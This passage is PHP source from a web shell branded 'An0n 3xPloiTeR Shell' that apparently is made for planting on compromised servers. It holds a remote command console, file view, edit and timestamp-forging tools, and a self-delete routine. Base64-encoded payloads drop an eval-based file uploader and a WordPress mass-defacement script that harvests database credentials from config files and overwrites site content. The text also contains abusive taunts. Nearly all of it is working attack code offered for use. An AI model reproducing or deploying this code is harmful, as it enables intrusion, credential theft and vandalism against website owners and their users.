				fclose($fp);
			}
		}exit;
	}
	if( @$_POST['p2'] == 'mkfile' ) {
		if(!file_exists($_POST['p1'])) {
			$fp = @fopen($_POST['p1'], 'w');
			if($fp) {
				$_POST['p2'] = "edit";
				fclose($fp);
			}
		}
	}
	An0n3xPloiTeRHeader();
	echo '<h1>File tools</h1><div class=content>';
	if( !file_exists(@$_POST['p1']) ) {
		echo 'File not exists';
		An0n3xPloiTeRFooter();
		return;
	}
	$uid = @posix_getpwuid(@fileowner($_POST['p1']));
	if(!$uid) {
		$uid['name'] = @fileowner($_POST['p1']);
		$gid['name'] = @filegroup($_POST['p1']);
	} else $gid = @posix_getgrgid(@filegroup($_POST['p1']));
	echo '<span>Name:</span> '.htmlspecialchars(@basename($_POST['p1'])).' <span>Size:</span> '.(is_file($_POST['p1'])?An0n3xPloiTeRViewSize(filesize($_POST['p1'])):'-').' <span>Permission:</span> '.An0n3xPloiTeRPermsColor($_POST['p1']).' <span>Owner/Group:</span> '.$uid['name'].'/'.$gid['name'].'<br>';
	echo '<span>Change time:</span> '.date('Y-m-d H:i:s',filectime($_POST['p1'])).' <span>Access time:</span> '.date('Y-m-d H:i:s',fileatime($_POST['p1'])).' <span>Modify time:</span> '.date('Y-m-d H:i:s',filemtime($_POST['p1'])).'<br><br>';
	if( empty($_POST['p2']) )
		$_POST['p2'] = 'view';
	if( is_file($_POST['p1']) )
		$m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch');
	else
		$m = array('Chmod', 'Rename', 'Touch');
	foreach($m as $v)
		echo '<a href=# onclick="g(null,null,\'' . urlencode($_POST['p1']) . '\',\''.strtolower($v).'\')">'.((strtolower($v)==@$_POST['p2'])?'<b>[ '.$v.' ]</b>':$v).'</a> ';
	echo '<br><br>';
	switch($_POST['p2']) {
		case 'view':
			echo '<pre class=ml1>';
			$fp = @fopen($_POST['p1'], 'r');
			if($fp) {
				while( !@feof($fp) )
					echo htmlspecialchars(@fread($fp, 1024));
				@fclose($fp);
			}
			echo '</pre>';
			break;
		case 'highlight':
			if( @is_readable($_POST['p1']) ) {
				echo '<div class=ml1 style="background-color: green;color:black;">';
				$code = @highlight_file($_POST['p1'],true);
				echo str_replace(array('<span ','</span>'), array('<font ','</font>'),$code).'</div>';
			}
			break;
		case 'chmod':
			if( !empty($_POST['p3']) ) {
				$perms = 0;
				for($i=strlen($_POST['p3'])-1;$i>=0;--$i)
					$perms += (int)$_POST['p3'][$i]*pow(8, (strlen($_POST['p3'])-$i-1));
				if(!@chmod($_POST['p1'], $perms))
					echo 'Can\'t set permissions!<br><script>document.mf.p3.value="";</script>';
			}
			clearstatcache();
			echo '<script>p3_="";</script><form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.chmod.value);return false;"><input type=text name=chmod value="'.substr(sprintf('%o', fileperms($_POST['p1'])),-4).'"><input type=submit value=">>"></form>';
			break;
		case 'edit':
			if( !is_writable($_POST['p1'])) {
				echo 'File isn\'t writeable';
				break;
			}
			if( !empty($_POST['p3']) ) {
				$time = @filemtime($_POST['p1']);
				$_POST['p3'] = substr($_POST['p3'],1);
				$fp = @fopen($_POST['p1'],"w");
				if($fp) {
					@fwrite($fp,$_POST['p3']);
					@fclose($fp);
					echo 'Saved!<br><script>p3_="";</script>';
					@touch($_POST['p1'],$time,$time);
				}
			}
			echo '<form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,\'1\'+this.text.value);return false;"><textarea name=text class=bigarea>';
			$fp = @fopen($_POST['p1'], 'r');
			if($fp) {
				while( !@feof($fp) )
					echo htmlspecialchars(@fread($fp, 1024));
				@fclose($fp);
			}
			echo '</textarea><input type=submit value=">>"></form>';
			break;
		case 'hexdump':
			$c = @file_get_contents($_POST['p1']);
			$n = 0;
			$h = array('00000000<br>','','');
			$len = strlen($c);
			for ($i=0; $i<$len; ++$i) {
				$h[1] .= sprintf('%02X',ord($c[$i])).' ';
				switch ( ord($c[$i]) ) {
					case 0:  $h[2] .= ' '; break;
					case 9:  $h[2] .= ' '; break;
					case 10: $h[2] .= ' '; break;
					case 13: $h[2] .= ' '; break;
					default: $h[2] .= $c[$i]; break;
				}
				$n++;
				if ($n == 32) {
					$n = 0;
					if ($i+1 < $len) {$h[0] .= sprintf('%08X',$i+1).'<br>';}
					$h[1] .= '<br>';
					$h[2] .= "\n";
				}
		 	}
			echo '<table cellspacing=1 cellpadding=5 bgcolor=#222222><tr><td bgcolor=#333333><span style="font-weight: normal;"><pre>'.$h[0].'</pre></span></td><td bgcolor=#282828><pre>'.$h[1].'</pre></td><td bgcolor=#333333><pre>'.htmlspecialchars($h[2]).'</pre></td></tr></table>';
			break;
		case 'rename':
			if( !empty($_POST['p3']) ) {
				if(!@rename($_POST['p1'], $_POST['p3']))
					echo 'Can\'t rename!<br>';
				else
					die('<script>g(null,null,"'.urlencode($_POST['p3']).'",null,"")</script>');
			}
			echo '<form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.name.value);return false;"><input type=text name=name value="'.htmlspecialchars($_POST['p1']).'"><input type=submit value=">>"></form>';
			break;
		case 'touch':
			if( !empty($_POST['p3']) ) {
				$time = strtotime($_POST['p3']);
				if($time) {
					if(!touch($_POST['p1'],$time,$time))
						echo 'Fail!';
					else
						echo 'Touched!';
				} else echo 'Bad time format!';
			}
			clearstatcache();
			echo '<script>p3_="";</script><form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.touch.value);return false;"><input type=text name=touch value="'.date("Y-m-d H:i:s", @filemtime($_POST['p1'])).'"><input type=submit value=">>"></form>';
			break;
	}
	echo '</div>';
	An0n3xPloiTeRFooter();
}

function actionConsole() {
    if(!empty($_POST['p1']) && !empty($_POST['p2'])) {
        An0n3xPloiTeRsetcookie(md5($_SERVER['HTTP_HOST']).'stderr_to_out', true);
        $_POST['p1'] .= ' 2>&1';
    } elseif(!empty($_POST['p1']))
        An0n3xPloiTeRsetcookie(md5($_SERVER['HTTP_HOST']).'stderr_to_out', 0);

	if(isset($_POST['ajax'])) {
		An0n3xPloiTeRsetcookie(md5($_SERVER['HTTP_HOST']).'ajax', true);
		ob_start();
		echo "d.cf.cmd.value='';\n";
		$temp = @iconv($_POST['charset'], 'UTF-8', addcslashes("\n$ ".$_POST['p1']."\n".An0n3xPloiTeREx($_POST['p1']),"\n\r\t\\'\0"));
		if(preg_match("!.*cd\s+([^;]+)$!",$_POST['p1'],$match))	{
			if(@chdir($match[1])) {
				$GLOBALS['cwd'] = @getcwd();
				echo "c_='".$GLOBALS['cwd']."';";
			}
		}
		echo "d.cf.output.value+='".$temp."';";
		echo "d.cf.output.scrollTop = d.cf.output.scrollHeight;";
		$temp = ob_get_clean();
		echo strlen($temp), "\n", $temp;
		exit;
	}
    if(empty($_POST['ajax'])&&!empty($_POST['p1']))
		An0n3xPloiTeRsetcookie(md5($_SERVER['HTTP_HOST']).'ajax', 0);
	An0n3xPloiTeRHeader();
    echo "<script>
if(window.Event) window.captureEvents(Event.KEYDOWN);
var cmds = new Array('');
var cur = 0;
function kp(e) {
	var n = (window.Event) ? e.which : e.keyCode;
	if(n == 38) {
		cur--;
		if(cur>=0)
			document.cf.cmd.value = cmds[cur];
		else
			cur++;
	} else if(n == 40) {
		cur++;
		if(cur < cmds.length)
			document.cf.cmd.value = cmds[cur];
		else
			cur--;
	}
}
function add(cmd) {
	cmds.pop();
	cmds.push(cmd);
	cmds.push('');
	cur = cmds.length-1;
}
</script>";
	echo '<center><h1>Console</h1></center><div class=content><form name=cf onsubmit="if(d.cf.cmd.value==\'clear\'){d.cf.output.value=\'\';d.cf.cmd.value=\'\';return false;}add(this.cmd.value);if(this.ajax.checked){a(null,null,this.cmd.value,this.show_errors.checked?1:\'\');}else{g(null,null,this.cmd.value,this.show_errors.checked?1:\'\');} return false;"><select name=alias>';
	foreach($GLOBALS['aliases'] as $n => $v) {
		if($v == '') {
			echo '<optgroup label="-'.htmlspecialchars($n).'-"></optgroup>';
			continue;
		}
		echo '<option value="'.htmlspecialchars($v).'">'.$n.'</option>';
	}
	
	echo '</select><input type=button onclick="add(d.cf.alias.value);if(d.cf.ajax.checked){a(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}else{g(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}" value=">>"> <nobr><input type=checkbox name=ajax value=1 '.(@$_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'> send using AJAX <input type=checkbox name=show_errors value=1 '.(!empty($_POST['p2'])||$_COOKIE[md5($_SERVER['HTTP_HOST']).'stderr_to_out']?'checked':'').'> redirect stderr to stdout (2>&1)</nobr><br/><textarea class=bigarea name=output style="border-bottom:0;margin:0;" readonly>';
	if(!empty($_POST['p1'])) {
		echo htmlspecialchars("$ ".$_POST['p1']."\n".An0n3xPloiTeREx($_POST['p1']));
	}
	echo '</textarea><table style="border:1px solid #df5;background-color:#666;border-top:0px;" cellpadding=0 cellspacing=0 width="100%"><tr><td width="1%">$</td><td><input type=text name=cmd style="border:0px;width:100%;" onkeydown="kp(event);"></td></tr></table>';
	echo '</form></div><script>d.cf.cmd.focus();</script>';
	An0n3xPloiTeRFooter();
}

function actionLogout() {
    unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
	die('<!DOCTYPE html>
<html>
	<head>
		<title>An0n 3xPloiTeR Shell</title>
		<meta charset="UTF-8">
		<meta http-equiv="refresh" content=""> <!-- For Refreshing after ____ interval of time -->
		<meta name="description" content="Sites description">
		<meta name="about" content="Made By An0n 3xPloiTeR">
		<meta name="description" content="Bye Bye">
		<style>
			.body {
				margin-top: 7vh;
				text-transform: capitalize;				
				background: black url("");
				background-repeat:no-repeat;
				background-position: center;
				background-attachment: fixed;
	            -webkit-background-size: cover;
                -moz-background-size: cover;
                -o-background-size: cover;
                background-size: cover;
			}
			.font {
				font-family: calibri;
				font-size: 300%;
				text-align: center;
				color: white;
			}
			.upass {
				margin-top: 70vh;
				font-family: calibri;
				font-size: 100%;
				text-align: center;
				color: black;
			}
		</style>
		<script language="JavaScript1.2">
			function ejs_nodroit(){
				alert("Login Please!");
				return(false);
			}
			document.oncontextmenu = ejs_nodroit;
		</script>
	</head>

	<body class="body">
		<div class="font">
			<font>You Are Going :(<br>Bye :(</font>
		</div>
	</body>
</html>');
}

function actionSelfRemove() {

	if($_POST['p1'] == 'yes')
		if(@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__)))
			die('<!DOCTYPE html>
<html>
	<head>
		<title>An0n 3xPloiTeR Shell</title>
		<meta charset="UTF-8">
		<meta http-equiv="refresh" content=""> <!-- For Refreshing after ____ interval of time -->
		<meta name="description" content="Sites description">
		<meta name="about" content="Made By An0n 3xPloiTeR">
		<meta name="description" content="Bye Bye">
		<style>
			.body {
				margin-top: 7vh;
				text-transform: capitalize;				
				background: black url("");
				background-repeat:no-repeat;
				background-position: center;
				background-attachment: fixed;
	            -webkit-background-size: cover;
                -moz-background-size: cover;
                -o-background-size: cover;
                background-size: cover;
			}
			.font {
				font-family: calibri;
				font-size: 300%;
				text-align: center;
				color: white;
			}
			.upass {
				margin-top: 70vh;
				font-family: calibri;
				font-size: 100%;
				text-align: center;
				color: black;
			}
		</style>
		<script language="JavaScript1.2">
			function ejs_nodroit(){
				alert("Shell Site Again Bitch!");
				return(false);
			}
			document.oncontextmenu = ejs_nodroit;
		</script>
	</head>

	<body class="body">
		<div class="font">
			<font>You Deleted Me :3<br>Now Fuck off :V</font>
		</div>
	</body>
</html>');
		else
			echo 'unlink error!';
    if($_POST['p1'] != 'yes')
        An0n3xPloiTeRHeader();
	echo '<center><h1>Suicide</h1><div class=content>Do You Want To Remove This Shell :o ?<br><a href=# onclick="g(null,null,\'yes\')">Yup</a></div>';
	An0n3xPloiTeRFooter();
}

	if(isset($_POST['uploader'])){
		$uploader = 'PD9waHAKJFVwbG9hZGVyID0gIlpXTm9ieUFuUEdoMGJXdytQR2hsWVdRK1BIUnBkR3hsUGtacGJHVWdWWEJzYjJGa1pYSWdZbmtnUVc0d2JpQXplRkJzYjJsVVpWSThMM1JwZEd4bFBnbzhiR2x1YXlCeVpXdzlJbWxqYjI0aUlIUjVjR1U5SW1sdFlXZGxMM0J1WnlJZ2FISmxaajBpYUhSMGNITTZMeTh4TG1Kd0xtSnNiMmR6Y0c5MExtTnZiUzh0YmtFdGEyRnZMWEpsVUVrdlZqaG9WMDF1WDJkelYwa3ZRVUZCUVVGQlFVRkVSbEV2WTFOQlNYSnlNV3huYjBsSFpsQXpMVWxyVDFOaFVtbzRTRTlwT0VoTVMwbDNRMUJqUWk5ek1UWXdNQzh4TkRFM01qQXlNbDh4TWpjME1ERTRNemMzTVRJek56aGZNVEEzTmpreU5EVXlORjl1TG1wd1p5SStQQzlvWldGa1BqeGliMlI1UGdvOGMzUjViR1UrQ21KdlpIbDdDbVp2Ym5RdFptRnRhV3g1T2lBaVVtRmphVzVuSUZOaGJuTWdUMjVsSWl3Z1kzVnljMmwyWlRzS1ltRmphMmR5YjNWdVpDMWpiMnh2Y2pvZ0kyVTJaVFpsTmpzS2RHVjRkQzF6YUdGa2IzYzZNSEI0SURCd2VDQXhjSGdnSXpjMU56VTNOVHNLZlFvalkyOXVkR1Z1ZENCMGNqcG9iM1psY25zS1ltRmphMmR5YjNWdVpDMWpiMnh2Y2pvZ0l6WXpOakkyTXpzS2RHVjRkQzF6YUdGa2IzYzZNSEI0SURCd2VDQXhNSEI0SUNObVptWTdDbjBLSTJOdmJuUmxiblFnTG1acGNuTjBld3BpWVdOclozSnZkVzVrTFdOdmJHOXlPaUJ6YVd4MlpYSTdDbjBLSTJOdmJuUmxiblFnTG1acGNuTjBPbWh2ZG1WeWV3cGlZV05yWjNKdmRXNWtMV052Ykc5eU9pQnphV3gyWlhJN0NuUmxlSFF0YzJoaFpHOTNPakJ3ZUNBd2NIZ2dNWEI0SUNNM05UYzFOelU3Q24wS2RHRmliR1Y3Q21KdmNtUmxjam9nTVhCNElDTXdNREF3TURBZ1pHOTBkR1ZrT3dwOUNrZ3hld3BtYjI1MExXWmhiV2xzZVRvZ0lsSjVaU0lzSUdOMWNuTnBkbVU3Q24wS1lYc0tZMjlzYjNJNllteDFaVHNLZEdWNGRDMWtaV052Y21GMGFXOXVPaUJ1YjI1bE93cDlDbUU2YUc5MlpYSjdDbU52Ykc5eU9pQWpZMlF3TUdabU93cDBaWGgwTFhOb1lXUnZkem93Y0hnZ01IQjRJREV3Y0hnZ0kyWm1abVptWmpzS2ZRcHBibkIxZEN4elpXeGxZM1FzZEdWNGRHRnlaV0Y3Q21KdmNtUmxjam9nTVhCNElDTXdNREF3TURBZ2MyOXNhV1E3Q2kxdGIzb3RZbTl5WkdWeUxYSmhaR2wxY3pvZ05YQjRPd290ZDJWaWEybDBMV0p2Y21SbGNpMXlZV1JwZFhNNk5YQjRPd3BpYjNKa1pYSXRjbUZrYVhWek9qVndlRHNLZlFvOEwzTjBlV3hsUGdvOEwwaEZRVVErQ2p4Q1QwUlpQZ284U0RFK1BHTmxiblJsY2o0OFptOXVkQ0JqYjJ4dmNqMGljbVZrSWo1K2ZuNDhMMlp2Ym5RK1EyOWtaV1FnWW5rZ1BHWnZiblFnWTI5c2IzSTlJbkpsWkNJK1FUd3ZabTl1ZEQ1dU1HNGdNM2c4Wm05dWRDQmpiMnh2Y2owaWNtVmtJajVRYkc5cFBDOW1iMjUwUGxSbFVqeG1iMjUwSUdOdmJHOXlQU0p5WldRaVBuNStmand2Wm05dWRENEtQR0p5UGp4bWIyNTBJR052Ykc5eVBTSmliSFZsSWo1K2ZuNVFZV3NnUEdadmJuUWdZMjlzYjNJOUluSmxaQ0krUTNsaVpYSThMMlp2Ym5RK0lFZG9iM04wYzM1K2Zqd3ZabTl1ZEQ0S0lEd3ZZMlZ1ZEdWeVBqd3ZTREUrQ2p4alpXNTBaWEkrQ2p4bWIzSnRJRzFsZEdodlpEMVFUMU5VSUdWdVkzUjVjR1U5SW0xMWJIUnBjR0Z5ZEM5bWIzSnRMV1JoZEdFaUlHRmpkR2x2YmowaUlqNEtJQ0FnSUR4cGJuQjFkQ0IwZVhCbFBYUmxlSFFnYm1GdFpUMXdZWFJvUGdvSlBHbHVjSFYwSUhSNWNHVTlJbVpwYkdVaUlHNWhiV1U5SW1acGJHVnpJajRLQ1R4cGJuQjFkQ0IwZVhCbFBYTjFZbTFwZENCMllXeDFaVDBpVlhCc2IyRmtJajRLUEM5bWIzSnRQand2WW05a2VUNDhMMk5sYm5SbGNqNDhMMmgwYld3K0p6c0tKR1pwYkdWeklEMGdRQ1JmUmtsTVJWTmJJbVpwYkdWeklsMDdDbWxtSUNna1ptbHNaWE5iSW01aGJXVWlYU0FoUFNBbkp5a2dld29nSUNBZ0pHWjFiR3h3WVhSb0lEMGdKRjlTUlZGVlJWTlVXeUp3WVhSb0lsMGdMaUFrWm1sc1pYTmJJbTVoYldVaVhUc0tJQ0FnSUdsbUlDaHRiM1psWDNWd2JHOWhaR1ZrWDJacGJHVW9KR1pwYkdWeld5ZDBiWEJmYm1GdFpTZGRMQ0FrWm5Wc2JIQmhkR2dwS1NCN0NpQWdJQ0FnSUNBZ1pXTm9ieUFpUEdObGJuUmxjajQ4YURJK1BHRWdhSEpsWmowbkpHWjFiR3h3WVhSb0p5QjBZWEpuWlhROUoxOWliR0Z1YXljK1EyeHBZMnNnZEc4Z1lXTmpaWE56SUhWd2JHOWhaR1ZrSUVacGJHVThMMkUrUEM5b01qNDhMMk5sYm5SbGNqNGlPd29nSUNBZ2ZRcDkiOyBldmFsKGJhc2U2NF9kZWNvZGUoJFVwbG9hZGVyKSk7Cj8+CQkJ';
		$file = fopen("uploader.php.py","w");
		$write = fwrite ($file ,base64_decode($uploader));
		fclose($file); 
		header("location:uploader.php");		} 

		if(isset($_POST['mass'])){
		$mass = 'PHRpdGxlPldvcmRwcmVzcyBNYXNzIERlZmFjZSBCeSBBbjBuIDN4UGxvaVRlUjwvdGl0bGU+CjxzdHlsZT4KYm9keQp7CgliYWNrZ3JvdW5kOiAjMGYwZTBkOwoJY29sb3I6ICNGRjk5MzM7CglwYWRkaW5nOiAwcHg7Cn0KYTpsaW5rLCBib2R5X2FsaW5rCnsKCWNvbG9yOiAjRkY5OTMzOwoJdGV4dC1kZWNvcmF0aW9uOiBub25lOwp9CmE6dmlzaXRlZCwgYm9keV9hdmlzaXRlZAp7Cgljb2xvcjogI0ZGOTkzMzsKCXRleHQtZGVjb3JhdGlvbjogbm9uZTsKfQphOmhvdmVyLCBhOmFjdGl2ZSwgYm9keV9haG92ZXIKewoJY29sb3I6ICNGRkZGRkY7Cgl0ZXh0LWRlY29yYXRpb246IG5vbmU7Cn0KdGQsIHRoLCBwLCBsaSx0YWJsZQp7CgkKCWJhY2tncm91bmQ6ICMyZTJiMjg7Cglib3JkZXI6MXB4IHNvbGlkICM1MjRmNDY7Cn0KaW5wdXQKewoJYm9yZGVyOiAxcHggc29saWQ7CgljdXJzb3I6IGRlZmF1bHQ7CgkKCW92ZXJmbG93OiBoaWRkZW47CgliYWNrZ3JvdW5kOiAjMmUyYjI4OwoJY29sb3I6ICNmZmZmZmY7Cn10ZXh0YXJlYQp7Cglib3JkZXI6IDFweCBzb2xpZDsKCWN1cnNvcjogZGVmYXVsdDsKCQoJb3ZlcmZsb3c6IGhpZGRlbjsKCWJhY2tncm91bmQ6ICMyZTJiMjg7Cgljb2xvcjogI2ZmZmZmZjsKfQpidXR0b24KewoJYm9yZGVyOiAxcHggc29saWQ7CgljdXJzb3I6IGRlZmF1bHQ7CgkKCW92ZXJmbG93OiBoaWRkZW47CgliYWNrZ3JvdW5kOiAjMmUyYjI4OwoJY29sb3I6ICNmZmZmZmY7Cn0KPC9zdHlsZT4KPC9oZWFkPgoKPGJvZHkgYmdjb2xvcj0iYmxhY2siPgo8Y2VudGVyPgo8cHJlPgpfXyAgICAgICAgICBfXyAgICAgIF9fICBfXyAgICAgICAgICAgICAgICAgX19fX18gICAgICAgIF9fICAgICAgICAgICAgICAgClwgXCAgICAgICAgLyAvICAgICB8ICBcLyAgfCAgICAgICAgICAgICAgIHwgIF9fIFwgICAgICAvIF98ICAgICAgICAgICAgICAKIFwgXCAgL1wgIC8gLyBfXyAgIHwgXCAgLyB8IF9fIF8gX19fIF9fXyAgfCB8ICB8IHwgX19ffCB8XyBfXyBfICBfX18gX19fIAogIFwgXC8gIFwvIC8gJ18gXCAgfCB8XC98IHwvIF9gIC8gX18vIF9ffCB8IHwgIHwgfC8gXyBcICBfLyBfYCB8LyBfXy8gXyBcCiAgIFwgIC9cICAvfCB8XykgfCB8IHwgIHwgfCAoX3wgXF9fIFxfXyBcIHwgfF9ffCB8ICBfXy8gfHwgKF98IHwgKF98ICBfXy8KICAgIFwvICBcLyB8IC5fXy8gIHxffCAgfF98XF9fLF98X19fL19fXy8gfF9fX19fLyBcX19ffF98IFxfXyxffFxfX19cX19ffAogICAgICAgICAgIHwgfCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgfF98ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKPC9wcmU+CjwvY2VudGVyPgo8Zm9ybSBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iIiA+CjxjZW50ZXI+Cjx0YWJsZSBib3JkZXI9JzEnPjx0cj48dGQ+TGlzdCBvZiBBbGwgU3ltbGlua3M8L3RkPjx0ZD4KPGlucHV0IHR5cGU9InRleHQiIG5hbWU9InVybCIgc2l6ZT0iMTAwIiB2YWx1ZT0idW1hci50eHQiPjwvdGQ+PC90cj4KPHRyPjx0ZD5JbmRleDwvdGQ+PHRkPgo8dGV4dGFyZWEgbmFtZT0iaW5kZXgiIGNvbHM9JzUwJyByb3dzPScxMCcgPjwvdGV4dGFyZWE+PC90ZD48L3RyPjwvdGFibGU+Cjxicj48YnI+PGlucHV0IHR5cGU9IlN1Ym1pdCIgbmFtZT0iU3VibWl0IiB2YWx1ZT0iU3VibWl0Ij4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYWN0aW9uIiB2YWx1ZT0iMSI+PC9mb3JtPgo8L2NlbnRlcj4KPD9waHAKc2V0X3RpbWVfbGltaXQoMCk7CmlmICgkX1BPU1RbJ2FjdGlvbiddID09ICcxJyl7CiR1cmw9aHRtbHNwZWNpYWxjaGFycygkX1BPU1RbJ3VybCddKTsKJHVzZXJzPUBmaWxlKCR1cmwpOwoKCmlmIChjb3VudCgkdXNlcnMpPDEpIGV4aXQoIjxoMT5ObyBjb25maWcgZm91bmQ8L2gxPiIpOwpmb3JlYWNoICgkdXNlcnMgYXMgJHVzZXIpIHsKJHVzZXIxPXRyaW0oJHVzZXIpOwokY29kZT1maWxlX2dldF9jb250ZW50czIoJHVzZXIxKTsKcHJlZ19tYXRjaF9hbGwoJ3xkZWZpbmUuKlwoLipcJ0RCX05BTUVcJy4qLC4qXCcoLiopXCcuKlwpLio7fGlzVScsJGNvZGUsJGIxKTsKJGRiPSRiMVsxXVswXTsKcHJlZ19tYXRjaF9hbGwoJ3xkZWZpbmUuKlwoLipcJ0RCX1VTRVJcJy4qLC4qXCcoLiopXCcuKlwpLio7fGlzVScsJGNvZGUsJGIyKTsKJHVzZXI9JGIyWzFdWzBdOwpwcmVnX21hdGNoX2FsbCgnfGRlZmluZS4qXCguKlwnREJfUEFTU1dPUkRcJy4qLC4qXCcoLiopXCcuKlwpLio7fGlzVScsJGNvZGUsJGIzKTsKJGRiX3Bhc3N3b3JkPSRiM1sxXVswXTsKcHJlZ19tYXRjaF9hbGwoJ3xkZWZpbmUuKlwoLipcJ0RCX0hPU1RcJy4qLC4qXCcoLiopXCcuKlwpLio7fGlzVScsJGNvZGUsJGI0KTsKJGhvc3Q9JGI0WzFdWzBdOwpwcmVnX21hdGNoX2FsbCgnfFwkdGFibGVfcHJlZml4Lio9LipcJyguKilcJy4qO3xpc1UnLCRjb2RlLCRiNSk7CiRwPSRiNVsxXVswXTsKCgokZD1AbXlzcWxfY29ubmVjdCggJGhvc3QsICR1c2VyLCAkZGJfcGFzc3dvcmQgKSA7CmlmICgkZCl7CkBteXNxbF9zZWxlY3RfZGIoJGRiICk7CiRzb3VyY2U9c3RyaXBzbGFzaGVzKCRfUE9TVFsnaW5kZXgnXSk7CiRzMj1zdHJUb0hleCgoJHNvdXJjZSkpOwokcz0iPHNjcmlwdD5kb2N1bWVudC5kb2N1bWVudEVsZW1lbnQuaW5uZXJIVE1MID0gdW5lc2NhcGUoJyckczInJyk7PC9zY3JpcHQ+IjsKJGxzPXN0cmxlbigkcyktMjsKJHNxbD0idXBkYXRlICIuJHAuIm9wdGlvbnMgc2V0IG9wdGlvbl92YWx1ZT0nYToyOntpOjI7YTozOntzOjU6XCJ0aXRsZVwiO3M6MDpcIlwiO3M6NDpcInRleHRcIjtzOiRsczpcIiRzXCI7czo2OlwiZmlsdGVyXCI7YjowO31zOjEyOlwiX211bHRpd2lkZ2V0XCI7aToxO30nIHdoZXJlIG9wdGlvbl9uYW1lPSd3aWRnZXRfdGV4dCc7ICI7Cm15c3FsX3F1ZXJ5KCRzcWwpIDsKJHNxbD0idXBkYXRlICIuJHAuIm9wdGlvbnMgc2V0IG9wdGlvbl92YWx1ZT0nYTo3OntzOjE5Olwid3BfaW5hY3RpdmVfd2lkZ2V0c1wiO2E6Njp7aTowO3M6MTA6XCJhcmNoaXZlcy0yXCI7aToxO3M6NjpcIm1ldGEtMlwiO2k6MjtzOjg6XCJzZWFyY2gtMlwiO2k6MztzOjEyOlwiY2F0ZWdvcmllcy0yXCI7aTo0O3M6MTQ6XCJyZWNlbnQtcG9zdHMtMlwiO2k6NTtzOjE3OlwicmVjZW50LWNvbW1lbnRzLTJcIjt9czo5Olwic2lkZWJhci0xXCI7YToxOntpOjA7czo2OlwidGV4dC0yXCI7fXM6OTpcInNpZGViYXItMlwiO2E6MDp7fXM6OTpcInNpZGViYXItM1wiO2E6MDp7fXM6OTpcInNpZGViYXItNFwiO2E6MDp7fXM6OTpcInNpZGViYXItNVwiO2E6MDp7fXM6MTM6XCJhcnJheV92ZXJzaW9uXCI7aTozO30nIHdoZXJlIG9wdGlvbl9uYW1lPSdzaWRlYmFyc193aWRnZXRzJzsiOwpteXNxbF9xdWVyeSgkc3FsKSA7CmlmIChmdW5jdGlvbl9leGlzdHMoIm1iX2NvbnZlcnRfZW5jb2RpbmciKSApCnsKJHNvdXJjZTIgPSBtYl9jb252ZXJ0X2VuY29kaW5nKCc8L3RpdGxlPicuJHNvdXJjZS4nPERJViBzdHlsZT0iRElTUExBWTogbm9uZSI+PHhtcD4nLCAnVVRGLTcnKTsKJHNvdXJjZTI9bXlzcWxfcmVhbF9lc2NhcGVfc3RyaW5nKCRzb3VyY2UyKTsKJHNxbCA9ICJVUERBVEUgYCIuJHAuIm9wdGlvbnNgIFNFVCBgb3B0aW9uX3ZhbHVlYCA9ICckc291cmNlMicgV0hFUkUgYG9wdGlvbl9uYW1lYCA9ICdibG9nbmFtZSc7IjsKQG15c3FsX3F1ZXJ5KCRzcWwpIDsgOwokc3FsPSAiVVBEQVRFIGAiLiRwLiJvcHRpb25zYCBTRVQgYG9wdGlvbl92YWx1ZWAgPSAnVVRGLTcnIFdIRVJFIGBvcHRpb25fbmFtZWAgPSAnYmxvZ19jaGFyc2V0JzsiOwpAbXlzcWxfcXVlcnkoJHNxbCkgOyA7Cn0KJGFhPUBteXNxbF9xdWVyeSgic2VsZWN0IG9wdGlvbl92YWx1ZSBmcm9tIGAiLiRwLiJvcHRpb25zYCBXSEVSRSBgb3B0aW9uX25hbWVgID0gJ3NpdGV1cmwnOyIpIDs7CiRzaXRldXJsPUBteXNxbF9mZXRjaF9hcnJheSgkYWEpIDsKJHNpdGV1cmw9JHNpdGV1cmxbJ29wdGlvbl92YWx1ZSddOwokdHIuPSIkc2l0ZXVybC9pbmRleC5waHBcbiI7Cm15c3FsX2Nsb3NlKCk7Cn0KfQppZiAoJHRyKSBlY2hvICJJbmRleCBjaGFuZ2VkIGZvciA8YnI+PGJyPjx0ZXh0YXJlYSBjb2xzPSc1MCcgcm93cz0nMTAnID4kdHI8L3RleHRhcmVhPiI7Cn0KZnVuY3Rpb24gc3RyVG9IZXgoJHN0cmluZykKewogICAgJGhleD0nJzsKICAgIGZvciAoJGk9MDsgJGkgPCBzdHJsZW4oJHN0cmluZyk7ICRpKyspCiAgICB7CglpZiAoc3RybGVuKGRlY2hleChvcmQoJHN0cmluZ1skaV0pKSk9PTEpewogICAgICAgICRoZXggLj0iJTAiLiBkZWNoZXgob3JkKCRzdHJpbmdbJGldKSk7CgkJfQoJCWVsc2UKCQl7CgkJJGhleCAuPSIlIi4gZGVjaGV4KG9yZCgkc3RyaW5nWyRpXSkpOwoJCX0KICAgIH0KICAgIHJldHVybiAkaGV4Owp9CgpmdW5jdGlvbiBmaWxlX2dldF9jb250ZW50czIoJHUpewoKCSRjaCA9IGN1cmxfaW5pdCgpOwogICAgY3VybF9zZXRvcHQoJGNoLENVUkxPUFRfVVJMLCR1KTsKIAljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfSEVBREVSLCAwKTsgICAgCiAgIGN1cmxfc2V0b3B0KCRjaCxDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLHRydWUpOwogICAgY3VybF9zZXRvcHQoJGNoLENVUkxPUFRfVVNFUkFHRU5ULCJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCA2LjE7IFdPVzY0OyBydjoxMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzE